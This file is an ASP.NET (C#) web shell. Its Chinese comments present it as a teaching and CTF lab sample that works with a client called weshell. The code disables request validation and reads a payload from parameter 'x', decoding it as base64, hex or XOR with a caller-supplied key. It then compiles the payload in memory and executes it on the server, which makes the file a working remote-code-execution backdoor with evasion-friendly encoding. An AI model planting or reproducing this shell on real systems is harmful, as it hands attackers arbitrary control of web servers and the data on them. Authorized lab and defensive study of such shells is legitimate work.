<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.Reflection" %>
<%
// 教学 / CTF 靶场样本：ASP.NET (C# / .NET Framework，IIS) 代码执行型一句话马
// 仅用于你自有或已获明确授权的靶机环境。
//
// weshell 的 aspnet 连接类型会经本文件下发「完整可编译的 C# 程序」（已含 using / 类 / 助手 / Run），
// 本文件只负责把它用 CSharpCodeProvider 编译进内存并执行，不再额外包裹。连接参数名为 x。
//
// 说明：CodeDom 仅在 .NET Framework（经典 ASP.NET / IIS）可用；
// .NET Core / .NET 5+ 已移除 System.CodeDom，请用 shell_aspx.aspx（命令执行型）。

// weshell 客户端按 enc 参数对 C# 载荷做编码（base64/hex/xor），此处对应解码；enc 缺省按 base64（兼容旧版）。
string __enc = Request.Unvalidated["enc"];
string __raw = Request.Unvalidated["x"];
string src = "";
if (!string.IsNullOrEmpty(__raw))
{
    byte[] __data;
    if (__enc == "hex")
    {
        __data = new byte[__raw.Length / 2];
        for (int i = 0; i < __data.Length; i++)
            __data[i] = (byte)int.Parse(__raw.Substring(i * 2, 2), System.Globalization.NumberStyles.HexNumber);
    }
    else if (__enc == "xor")
    {
        byte[] __k = System.Text.Encoding.UTF8.GetBytes(Request.Unvalidated["key"] ?? "");
        __data = new byte[__raw.Length];
        for (int i = 0; i < __raw.Length; i++) __data[i] = (byte)__raw[i];
        if (__k.Length > 0)
            for (int i = 0; i < __data.Length; i++) __data[i] = (byte)(__data[i] ^ __k[i % __k.Length]);
    }
    else
    {
        try { __data = Convert.FromBase64String(__raw); }
        catch (System.Exception) { src = __raw; __data = null; }
    }
    if (__data != null) src = System.Text.Encoding.UTF8.GetString(__data);
}
if (!string.IsNullOrEmpty(src))
{
    var cp = new CompilerParameters
    {
        GenerateInMemory = true,
        IncludeDebugInformation = false
    };
    cp.ReferencedAssemblies.Add("System.dll");
    cp.ReferencedAssemblies.Add("System.Web.dll");
    cp.ReferencedAssemblies.Add("System.Management.dll");
    cp.ReferencedAssemblies.Add("System.Data.dll");
    cp.ReferencedAssemblies.Add("System.Xml.dll");
    cp.ReferencedAssemblies.Add("Microsoft.CSharp.dll");

    using (var provider = new CSharpCodeProvider())
    {
        var result = provider.CompileAssemblyFromSource(cp, src);
        if (result.Errors.HasErrors)
        {
            foreach (CompilerError e in result.Errors)
                Response.Write("[CompileError] " + e.ToString() + "\n");
        }
        else
        {
            var asm = result.CompiledAssembly;
            asm.GetType("WshRunner").GetMethod("Run").Invoke(null, null);
        }
    }
}
%>
